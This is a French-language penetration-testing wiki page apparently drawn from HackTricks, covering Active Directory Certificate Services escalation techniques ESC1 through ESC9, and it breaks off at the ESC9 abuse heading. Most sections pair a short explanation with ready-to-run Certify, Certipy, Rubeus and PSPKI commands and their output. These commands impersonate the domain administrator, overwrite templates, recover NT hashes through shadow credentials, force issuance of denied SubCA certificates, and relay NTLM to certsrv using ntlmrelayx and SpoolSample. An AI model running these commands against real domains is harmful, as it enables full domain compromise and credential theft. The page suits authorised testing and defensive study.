# Escalade de domaine AD CS

{{#include ../../../banners/hacktricks-training.md}}


**Ceci est un résumé des sections de techniques d'escalade des posts :**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Modèles de certificats mal configurés - ESC1

### Explication

### Modèles de certificats mal configurés - ESC1 expliqué

- **Les droits d'enrôlement sont accordés aux utilisateurs peu privilégiés par la CA d'entreprise.**
- **L'approbation d'un manager n'est pas requise.**
- **Aucune signature de personnel autorisé n'est nécessaire.**
- **Les descripteurs de sécurité des modèles de certificats sont trop permissifs, permettant aux utilisateurs peu privilégiés d'obtenir des droits d'enrôlement.**
- **Les modèles de certificats sont configurés pour définir des EKU qui facilitent l'authentification :**
- Extended Key Usage (EKU) identifiers such as Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0), or no EKU (SubCA) are included.
- **La possibilité pour les demandeurs d'inclure un subjectAltName dans le Certificate Signing Request (CSR) est autorisée par le modèle :**
- Active Directory (AD) priorise le subjectAltName (SAN) dans un certificat pour la vérification d'identité s'il est présent. Cela signifie qu'en spécifiant le SAN dans un CSR, un certificat peut être demandé pour usurper n'importe quel utilisateur (par ex., un administrateur de domaine). La possibilité de spécifier un SAN par le demandeur est indiquée dans l'objet AD du modèle de certificat via la propriété `mspki-certificate-name-flag`. Cette propriété est un bitmask, et la présence du flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` permet la spécification du SAN par le demandeur.

> [!CAUTION]
> La configuration décrite permet aux utilisateurs peu privilégiés de demander des certificats avec n'importe quel SAN, autorisant l'authentification en tant que n'importe quel principal du domaine via Kerberos ou SChannel.

Cette fonctionnalité est parfois activée pour permettre la génération à la volée de certificats HTTPS ou de certificats de serveurs par des produits ou des services de déploiement, ou par manque de compréhension.

Il est à noter que la création d'un certificat avec cette option génère un avertissement, ce qui n'est pas le cas lorsqu'un modèle de certificat existant (comme le modèle `WebServer`, qui a `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` activé) est dupliqué puis modifié pour inclure un OID d'authentification.

### Abus

Pour **trouver les modèles de certificats vulnérables** vous pouvez exécuter :
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Pour **abuser de cette vulnérabilité afin de se faire passer pour un administrateur**, on pourrait exécuter :
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
Vous pouvez ensuite convertir le **certificat généré au format `.pfx`** et l'utiliser pour **vous authentifier avec Rubeus ou certipy** à nouveau :
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Les binaires Windows "Certreq.exe" et "Certutil.exe" peuvent être utilisés pour générer le PFX : https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

L'énumération des modèles de certificats dans le schéma de configuration de la forêt AD, en particulier ceux qui ne nécessitent pas d'approbation ou de signatures, possédant une EKU Client Authentication ou Smart Card Logon, et avec le drapeau `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` activé, peut être effectuée en exécutant la requête LDAP suivante :
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Modèles de certificats mal configurés - ESC2

### Explication

1. Les droits d'enrôlement sont accordés à des utilisateurs à faibles privilèges par l'Enterprise CA.
2. L'exigence d'une approbation par un manager est désactivée.
3. La nécessité de signatures autorisées est omise.
4. Un descripteur de sécurité excessivement permissif sur le modèle de certificat accorde les droits d'enrôlement de certificats à des utilisateurs à faibles privilèges.
5. **Le modèle de certificat est défini pour inclure le Any Purpose EKU ou aucun EKU.**

Le **Any Purpose EKU** permet à un attaquant d'obtenir un certificat pour **n'importe quel usage**, y compris l'authentification client, l'authentification serveur, la signature de code, etc. La même **technique utilisée pour ESC3** peut être employée pour exploiter ce scénario.

Les certificats sans **EKUs**, qui agissent comme des certificats de CA subordonnée, peuvent être exploités pour **n'importe quel usage** et peuvent **également être utilisés pour signer de nouveaux certificats**. Ainsi, un attaquant pourrait spécifier des EKUs arbitraires ou des champs dans les nouveaux certificats en utilisant un certificat de CA subordonnée.

Toutefois, les nouveaux certificats créés pour **l'authentification de domaine** ne fonctionneront pas si la CA subordonnée n'est pas approuvée par l'objet **`NTAuthCertificates`**, ce qui est le paramètre par défaut. Néanmoins, un attaquant peut toujours créer des **nouveaux certificats avec n'importe quel EKU** et des valeurs de certificat arbitraires. Ceux-ci pourraient être potentiellement **abusés** pour une grande variété d'usages (par ex. signature de code, authentification serveur, etc.) et pourraient avoir des conséquences importantes pour d'autres applications du réseau comme SAML, AD FS ou IPSec.

Pour énumérer les modèles correspondant à ce scénario dans le schéma de configuration de la forêt AD, la requête LDAP suivante peut être exécutée :
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Modèles Enrolment Agent mal configurés - ESC3

### Explication

Ce scénario ressemble au premier et au deuxième mais **en abusant** d'un **EKU différent** (Certificate Request Agent) et de **2 modèles différents** (il y a donc 2 ensembles d'exigences),

Le **Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), connu sous le nom **Enrollment Agent** dans la documentation Microsoft, permet à un principal de **obtenir** un **certificat** **au nom d'un autre utilisateur**.

L'**« enrollment agent »** s'enregistre dans un tel **modèle** et utilise le **certificat résultant pour cosigner une CSR au nom de l'autre utilisateur**. Il **envoie** ensuite la **CSR cosignée** à la CA, s'enregistrant dans un **modèle** qui **permet « d'enregistrer au nom de »**, et la CA renvoie un **certificat appartenant à l'« autre » utilisateur**.

**Exigences 1:**

- Les droits d'enrôlement sont accordés à des utilisateurs à faibles privilèges par la CA d'entreprise.
- L'exigence d'approbation du responsable est omise.
- Aucune exigence de signatures autorisées.
- Le descripteur de sécurité du modèle de certificat est excessivement permissif, accordant des droits d'enrôlement à des utilisateurs à faibles privilèges.
- Le modèle de certificat inclut le Certificate Request Agent EKU, permettant la demande d'autres modèles de certificats au nom d'autres principaux.

**Exigences 2:**

- La CA d'entreprise accorde des droits d'enrôlement à des utilisateurs à faibles privilèges.
- L'approbation du responsable est contournée.
- La version du schéma du modèle est soit 1 soit supérieure à 2, et il spécifie une Application Policy Issuance Requirement qui nécessite le Certificate Request Agent EKU.
- Un EKU défini dans le modèle de certificat permet l'authentification de domaine.
- Les restrictions pour les enrollment agents ne sont pas appliquées sur la CA.

### Abus

Vous pouvez utiliser [**Certify**](https://github.com/GhostPack/Certify) ou [**Certipy**](https://github.com/ly4k/Certipy) pour abuser de ce scénario :
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
Les **utilisateurs** autorisés à **obtenir** un **enrollment agent certificate**, les modèles dans lesquels les **enrollment agents** sont autorisés à s'enregistrer, et les **comptes** au nom desquels l'enrollment agent peut agir peuvent être restreints par les CA d'entreprise. Cela se fait en ouvrant le **snap-in** `certsrc.msc`, en **cliquant droit sur la CA**, en **cliquant sur Properties**, puis en **naviguant** vers l'onglet « Enrollment Agents ».

Cependant, il est à noter que le paramètre **par défaut** des CA est « **Do not restrict enrollment agents** ». Lorsque la restriction des agents d'enrôlement est activée par les administrateurs, en la réglant sur « Restrict enrollment agents », la configuration par défaut reste extrêmement permissive. Elle permet à **Everyone** de s'enregistrer sur tous les modèles en tant que n'importe qui.

## Contrôle d'accès des modèles de certificats vulnérable - ESC4

### **Explication**

Le **security descriptor** des **certificate templates** définit les **permissions** que possèdent les **AD principals** concernant le modèle.

Si un **attacker** possède les **permissions** requises pour **modifier** un **template** et **instaurer** des **misconfigurations exploitables** décrites dans les **sections précédentes**, une élévation de privilèges pourrait être facilitée.

Les permissions notables applicables aux certificate templates incluent :

- **Owner:** Accorde un contrôle implicite sur l'objet, permettant la modification de n'importe quel attribut.
- **FullControl:** Permet une autorité complète sur l'objet, y compris la capacité de modifier n'importe quel attribut.
- **WriteOwner:** Autorise la modification du propriétaire de l'objet vers un principal sous le contrôle de l'**attacker**.
- **WriteDacl:** Permet l'ajustement des contrôles d'accès, pouvant potentiellement accorder à un **attacker** le **FullControl**.
- **WriteProperty:** Autorise la modification de n'importe quelle propriété de l'objet.

### Abus

Pour identifier les principals ayant des droits d'édition sur les templates et autres objets PKI, énumérez avec Certify :
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
Un exemple de privesc similaire au précédent :

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 correspond à un cas où un utilisateur possède des droits d'écriture sur un modèle de certificat. Cela peut, par exemple, être abusé pour écraser la configuration du modèle de certificat afin de rendre le modèle vulnérable à ESC1.

Comme on peut le voir dans le chemin ci‑dessus, seul `JOHNPC` possède ces privilèges, mais notre utilisateur `JOHN` a le nouveau lien `AddKeyCredentialLink` vers `JOHNPC`. Puisque cette technique est liée aux certificats, j'ai également implémenté cette attaque, connue sous le nom de [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Voici un petit aperçu de la commande `shadow auto` de Certipy pour récupérer le NT hash de la victime.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** peut écraser la configuration d'un modèle de certificat avec une seule commande. Par **défaut**, Certipy va **écraser** la configuration pour la rendre **vulnérable à ESC1**. Nous pouvons aussi spécifier le **paramètre `-save-old` pour sauvegarder l'ancienne configuration**, ce qui sera utile pour **restaurer** la configuration après notre attaque.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Vulnerable PKI Object Access Control - ESC5

### Explication

L'étendue des relations interconnectées basées sur les ACL, qui inclut plusieurs objets au-delà des certificate templates et de la certificate authority, peut affecter la sécurité de l'ensemble du système AD CS. Ces objets, qui peuvent avoir un impact significatif sur la sécurité, comprennent :

- L'AD computer object du serveur CA, qui peut être compromis via des mécanismes comme S4U2Self ou S4U2Proxy.
- Le RPC/DCOM server du serveur CA.
- Tout AD object descendant ou container situé dans le chemin de container spécifique `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Ce chemin inclut, sans s'y limiter, des containers et objets tels que le Certificate Templates container, le Certification Authorities container, l'objet NTAuthCertificates, et l'Enrollment Services Container.

La sécurité du système PKI peut être compromise si un attaquant à faibles privilèges parvient à prendre le contrôle de l'un de ces composants critiques.

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Explication

Le sujet abordé dans la [**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage) traite également des implications du flag **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, telles que décrites par Microsoft. Cette configuration, lorsqu'elle est activée sur une Certification Authority (CA), permet l'inclusion de **valeurs définies par l'utilisateur** dans le **subject alternative name** pour **toute requête**, y compris celles construites à partir d'Active Directory®. Par conséquent, cette disposition permet à un **intrus** de s'enregistrer via **n'importe quel template** configuré pour l'**authentication** de domaine — en particulier ceux ouverts à l'enrollment d'utilisateurs **non privilégiés**, comme le template User standard. En résultat, un certificat peut être délivré, permettant à l'intrus de s'authentifier en tant qu'administrateur de domaine ou **toute autre entité active** au sein du domaine.

**Note** : L'approche pour ajouter des **alternative names** dans une Certificate Signing Request (CSR), via l'argument `-attrib "SAN:"` dans `certreq.exe` (appelé “Name Value Pairs”), contraste avec la stratégie d'exploitation des SANs décrite en ESC1. Ici, la distinction réside dans la manière dont les informations de compte sont encapsulées — au sein d'un attribut de certificat, plutôt que dans une extension.

### Abus

Pour vérifier si le paramètre est activé, les organisations peuvent utiliser la commande suivante avec `certutil.exe` :
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Cette opération utilise essentiellement **remote registry access**, donc une approche alternative pourrait être :
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Des outils comme [**Certify**](https://github.com/GhostPack/Certify) et [**Certipy**](https://github.com/ly4k/Certipy) sont capables de détecter cette mauvaise configuration et de l'exploiter :
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Pour modifier ces paramètres, en supposant que l'on possède les **droits d'administrateur de domaine** ou l'équivalent, la commande suivante peut être exécutée depuis n'importe quel poste de travail :
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Pour désactiver cette configuration dans votre environnement, le flag peut être supprimé avec :
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> Après les mises à jour de sécurité de mai 2022, les **certificates** nouvellement émis contiendront une **security extension** qui incorpore la **requester's `objectSid` property**. Pour ESC1, ce SID est dérivé du SAN spécifié. Cependant, pour **ESC6**, le SID reflète le **requester's `objectSid`**, et non le SAN.\
> Pour exploiter ESC6, il est essentiel que le système soit susceptible à ESC10 (Weak Certificate Mappings), qui privilégie le **SAN over the new security extension**.

## Contrôle d'accès vulnérable de la Certificate Authority - ESC7

### Attaque 1

#### Explication

Le contrôle d'accès d'une Certificate Authority est assuré par un ensemble de permissions qui régissent les actions du CA. Ces permissions peuvent être consultées en ouvrant `certsrv.msc`, en faisant un clic droit sur une CA, en sélectionnant Propriétés, puis en allant dans l'onglet Sécurité. De plus, les permissions peuvent être énumérées à l'aide du module PSPKI avec des commandes telles que:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Cela fournit des informations sur les droits principaux, à savoir **`ManageCA`** et **`ManageCertificates`**, correspondant aux rôles de “CA administrator” et “Certificate Manager” respectivement.

#### Abus

Disposer des droits **`ManageCA`** sur une autorité de certification permet au principal de modifier les paramètres à distance via PSPKI. Cela inclut le basculement du drapeau **`EDITF_ATTRIBUTESUBJECTALTNAME2`** pour autoriser la spécification de SAN dans n'importe quel modèle, un aspect critique de l'escalade de domaine.

Ce processus peut être simplifié en utilisant le cmdlet **Enable-PolicyModuleFlag** de PSPKI, permettant des modifications sans interaction directe avec la GUI.

La possession des droits **`ManageCertificates`** facilite l'approbation des requêtes en attente, contournant effectivement la protection "CA certificate manager approval".

Une combinaison des modules **Certify** et **PSPKI** peut être utilisée pour demander, approuver et télécharger un certificat :
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Attack 2

#### Explication

> [!WARNING]
> Dans l'**attaque précédente**, les permissions **`Manage CA`** ont été utilisées pour **activer** le flag **EDITF_ATTRIBUTESUBJECTALTNAME2** afin d'exécuter l'**ESC6 attack**, mais cela n'aura aucun effet tant que le service CA (`CertSvc`) n'aura pas été redémarré. Lorsqu'un utilisateur possède le droit d'accès `Manage CA`, il est également autorisé à **redémarrer le service**. Cependant, cela **ne signifie pas que l'utilisateur peut redémarrer le service à distance**. De plus, **ESC6 pourrait ne pas fonctionner immédiatement** dans la plupart des environnements patchés en raison des mises à jour de sécurité de mai 2022.

Par conséquent, une autre attaque est présentée ici.

Prérequis:

- Uniquement la **`ManageCA` permission**
- La **`Manage Certificates`** permission (peut être accordée depuis **`ManageCA`**)
- Le template de certificat **`SubCA`** doit être **activé** (peut être activé depuis **`ManageCA`**)

La technique repose sur le fait que les utilisateurs disposant des droits d'accès `Manage CA` _et_ `Manage Certificates` peuvent **soumettre des demandes de certificats qui échouent**. Le template de certificat **`SubCA`** est **vulnérable à ESC1**, mais **seuls les administrateurs** peuvent s'inscrire sur ce template. Ainsi, un **utilisateur** peut **demander** l'enrôlement dans **`SubCA`** — ce qui sera **refusé** — mais **sera ensuite délivré par le responsable**.

#### Abus

Vous pouvez **vous accorder le droit d'accès `Manage Certificates`** en ajoutant votre utilisateur en tant que nouvel agent.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
Le modèle **`SubCA`** peut être **activé sur la CA** avec le paramètre `-enable-template`. Par défaut, le modèle `SubCA` est activé.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Si nous avons rempli les prérequis pour cette attaque, nous pouvons commencer par **demander un certificat basé sur le modèle `SubCA`**.

**Cette requête sera refusée**, mais nous conserverons la clé privée et noterons l'ID de la requête.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Avec nos **`Manage CA` and `Manage Certificates`**, nous pouvons ensuite **émettre la demande de certificat échouée** avec la commande `ca` et le paramètre `-issue-request <request ID>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
Et enfin, nous pouvons **récupérer le certificat émis** avec la commande `req` et le paramètre `-retrieve <request ID>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Attaque 3 – Abus de l'extension Manage Certificates (SetExtension)

#### Explication

En plus des abus classiques d'ESC7 (activation des attributs EDITF ou approbation des requêtes en attente), **Certify 2.0** a révélé un nouveau primitive qui ne nécessite que le rôle *Manage Certificates* (alias **Certificate Manager / Officer**) sur la CA d'entreprise.

La méthode RPC `ICertAdmin::SetExtension` peut être exécutée par n'importe quel principal disposant de *Manage Certificates*. Alors que la méthode était traditionnellement utilisée par les CA légitimes pour mettre à jour des extensions sur des requêtes **en attente**, un attaquant peut l'abuser pour **ajouter une extension de certificat *non-par défaut*** (par exemple un OID personnalisé de *Certificate Issuance Policy* comme `1.1.1.1`) à une requête en attente d'approbation.

Parce que le template ciblé **ne définit pas de valeur par défaut pour cette extension**, la CA ne remplacera PAS la valeur contrôlée par l'attaquant lorsque la requête sera finalement émise. Le certificat résultant contient donc une extension choisie par l'attaquant qui peut :

* Satisfaire les exigences d'Application / Issuance Policy d'autres templates vulnérables (conduisant à une élévation de privilèges).
* Injecter des EKU ou des policies supplémentaires accordant au certificat une confiance inattendue dans des systèmes tiers.

En bref, *Manage Certificates* — précédemment considéré comme la moitié « moins puissante » d'ESC7 — peut désormais être exploité pour une élévation de privilèges complète ou une persistance à long terme, sans toucher à la configuration de la CA ni nécessiter le droit plus restrictif *Manage CA*.

#### Abuser du primitive avec Certify 2.0

1. **Soumettez une requête de certificat qui restera *en attente*.** Ceci peut être forcé avec un template qui requiert l'approbation d'un manager :
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. **Ajoutez une extension personnalisée à la requête en attente** en utilisant la nouvelle commande `manage-ca` :
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*If the template does not already define the *Certificate Issuance Policies* extension, the value above will be preserved after issuance.*

3. **Émettez la requête** (si votre rôle a aussi les droits d'approbation *Manage Certificates*) ou attendez qu'un opérateur l'approuve. Une fois émise, téléchargez le certificat :
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. Le certificat obtenu contient maintenant l'OID malveillant de policy d'émission et peut être utilisé dans des attaques ultérieures (par ex. ESC13, escalade de domaine, etc.).

> NOTE:  The same attack can be executed with Certipy ≥ 4.7 through the `ca` command and the `-set-extension` parameter.

## NTLM Relay to AD CS HTTP Endpoints – ESC8

### Explication

> [!TIP]
> Dans des environnements où **AD CS est installé**, si existe un **endpoint d'enrôlement web vulnérable** et qu'au moins un **template de certificat publié** autorise **l'enrôlement des ordinateurs de domaine et l'authentification client** (comme le template par défaut **`Machine`**), il devient possible que **n'importe quel ordinateur avec le service spooler actif soit compromis par un attaquant** !

Plusieurs **méthodes d'enrôlement basées sur HTTP** sont prises en charge par AD CS, rendues disponibles via des rôles de serveur additionnels que les administrateurs peuvent installer. Ces interfaces d'enrôlement HTTP sont vulnérables aux **attaques de relay NTLM**. Un attaquant, depuis une **machine compromise**, peut usurper n'importe quel compte AD qui s'authentifie via NTLM entrant. En usurpant le compte victime, ces interfaces web peuvent être utilisées par un attaquant pour **demander un certificat d'authentification client en utilisant les templates `User` ou `Machine`**.

- L'**interface d'enrôlement web** (une application ASP plus ancienne disponible à `http://<caserver>/certsrv/`), fonctionne par défaut en HTTP uniquement, ce qui n'offre aucune protection contre les attaques de relay NTLM. De plus, elle n'autorise explicitement que NTLM via son en-tête Authorization HTTP, rendant les méthodes d'authentification plus sécurisées comme Kerberos inapplicables.
- Le **Certificate Enrollment Service** (CES), le **Certificate Enrollment Policy** (CEP) Web Service, et le **Network Device Enrollment Service** (NDES) supportent par défaut la negotiate authentication via leur en-tête Authorization HTTP. La negotiate authentication **supporte à la fois** Kerberos et **NTLM**, permettant à un attaquant de **dégrader vers NTLM** lors d'attaques de relay. Bien que ces services web activent HTTPS par défaut, HTTPS seul **ne protège pas contre les attaques de relay NTLM**. La protection contre le relay NTLM pour les services HTTPS n'est possible que lorsque HTTPS est combiné avec le channel binding. Malheureusement, AD CS n'active pas Extended Protection for Authentication sur IIS, qui est requise pour le channel binding.

Un problème courant des attaques de relay NTLM est la **courte durée des sessions NTLM** et l'incapacité de l'attaquant à interagir avec des services qui **exigent le signing NTLM**.

Néanmoins, cette limitation peut être contournée en exploitant un relay NTLM pour obtenir un certificat pour l'utilisateur, car la durée de validité du certificat dicte la durée de la session, et le certificat peut être utilisé auprès de services qui **exigent le signing NTLM**. Pour des instructions sur l'utilisation d'un certificat volé, voir :


{{#ref}}
account-persistence.md
{{#endref}}

Une autre limitation des attaques de relay NTLM est qu'**une machine contrôlée par l'attaquant doit être authentifiée par un compte victime**. L'attaquant peut soit attendre, soit tenter de **forcer** cette authentification :


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Abus**

[**Certify**](https://github.com/GhostPack/Certify)’s `cas` énumère les **endpoints HTTP AD CS activés** :
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

La propriété `msPKI-Enrollment-Servers` est utilisée par les autorités de certification d'entreprise (Certificate Authorities, CAs) pour stocker les endpoints du Certificate Enrollment Service (CES). Ces endpoints peuvent être analysés et listés en utilisant l'outil **Certutil.exe** :
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Abus avec Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Abus avec [Certipy](https://github.com/ly4k/Certipy)

Par défaut, Certipy effectue la demande de certificat en se basant sur le template `Machine` ou `User`, déterminé par le fait que le nom du compte relayé se termine par `$`. La spécification d'un template alternatif peut être effectuée en utilisant le paramètre `-template`.

Une technique telle que [PetitPotam](https://github.com/ly4k/PetitPotam) peut alors être utilisée pour forcer l'authentification. Lorsqu'il s'agit de contrôleurs de domaine, la spécification `-template DomainController` est requise.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## Pas d'extension de sécurité - ESC9 <a href="#id-5485" id="id-5485"></a>

### Explication

La nouvelle valeur **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) pour **`msPKI-Enrollment-Flag`**, appelée ESC9, empêche l'inclusion de la nouvelle extension de sécurité **`szOID_NTDS_CA_SECURITY_EXT`** dans un certificat. Ce flag devient pertinent lorsque `StrongCertificateBindingEnforcement` est réglé sur `1` (valeur par défaut), contrairement à `2`. Son importance augmente dans les scénarios où un mappage de certificat plus faible pour Kerberos ou Schannel pourrait être exploité (comme dans ESC10), étant donné que l'absence d'ESC9 ne modifierait pas les exigences.

Les conditions dans lesquelles la configuration de ce flag devient significative incluent :

- `StrongCertificateBindingEnforcement` n'est pas réglé sur `2` (la valeur par défaut étant `1`), ou `CertificateMappingMethods` inclut le flag `UPN`.
- Le certificat est marqué avec le flag `CT_FLAG_NO_SECURITY_EXTENSION` dans le paramètre `msPKI-Enrollment-Flag`.
- Le certificat spécifie n'importe quelle EKU d'authentification client.
- Des permissions `GenericWrite` sont disponibles sur n'importe quel compte permettant de compromettre un autre.

### Scénario d'abus

